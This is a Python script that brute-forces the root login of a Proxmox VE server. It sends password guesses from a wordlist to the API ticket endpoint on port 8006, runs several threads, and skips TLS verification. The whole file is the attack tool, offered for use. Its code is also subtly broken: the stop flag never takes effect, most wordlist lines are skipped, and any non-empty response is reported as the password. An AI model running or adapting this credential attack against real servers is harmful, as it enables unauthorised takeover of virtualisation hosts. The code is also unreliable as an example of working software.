import requests, argparse
from datetime import datetime
import threading
from time import sleep
global x 

def attack(host,line,verbose,timeout):
    if verbose == True:
        print("[" + str(datetime.now().strftime("%H:%M:%S")) + "] " + "try : " + line.strip())
    payload = "username=root&password=" + line.strip() + "&realm=pam&new-format=1"
    target = "https://" + host + ":8006/api2/extjs/access/ticket"
    requests.packages.urllib3.disable_warnings()
    try:
        out = requests.post(target, data=payload, verify=False, stream=True, timeout=timeout)
        if out.text:
            print('Password is : ' + str(line))
            x = True
    except:
        pass

def main(host, filepath, verbose, thread, timeout):
    print('Start Attack')
    x = False
    with open(filepath) as fp:
        cnt = 0
        end = thread
        while True:
            line_list = fp.readlines(int(thread))
            line = str(line_list[0]).replace('\n', '')
            if not line:
                break
            try:
                t = threading.Thread(target=attack, args=(host,line,verbose,timeout,), daemon=True)
                t.start()
                cnt += 1
                if cnt >= end:
                    t.join()
                    end += thread
            except KeyboardInterrupt:
                print("\nExit")
                break
            if x is True:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target","-t", help="Proxmox VE target", required=True)
    parser.add_argument("--Password","-P", help="Password file", required=True)
    parser.add_argument("--verbose", help="Verbose mode", action="store_true")
    parser.add_argument("-T", help='Number of Thread (default=5)')
    parser.add_argument("--timeout", help='Set timeout value (default=1)')
    args = parser.parse_args()
    host = args.target
    filepath = args.Password
    verbose = args.verbose
    if not args.T:
        thread = 5
    else:
        thread = int(args.T)

    if not args.timeout:
        timeout = 1
    else:
        timeout = int(args.timeout)

    main(host, filepath, verbose, thread, timeout)